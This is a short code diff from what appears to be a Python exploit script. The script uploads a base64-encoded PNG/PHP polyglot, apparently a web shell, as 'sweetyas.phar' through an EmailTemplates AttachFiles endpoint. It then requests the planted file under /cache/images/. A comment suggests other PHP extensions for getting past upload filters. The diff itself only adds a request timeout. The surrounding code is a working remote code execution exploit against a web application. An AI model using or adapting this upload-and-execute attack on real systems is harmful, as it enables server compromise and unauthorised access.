@@ -31,7 +31,7 @@ png_sh = "iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvIC
 upload = {"file": ("sweetyas.phar", base64.b64decode(png_sh), "image/png")} # you can also try with other extensions like .php7 .php5 or .phtml
 params = {"module": "EmailTemplates", "action": "AttachFiles"}
 
-requests.post(url, cookies=session, data=params, files=upload, verify=False)
+requests.post(url, cookies=session, data=params, files=upload, verify=False, timeout=120)
 
 url = sys.argv[1] + "/cache/images/sweetyas.phar"
 
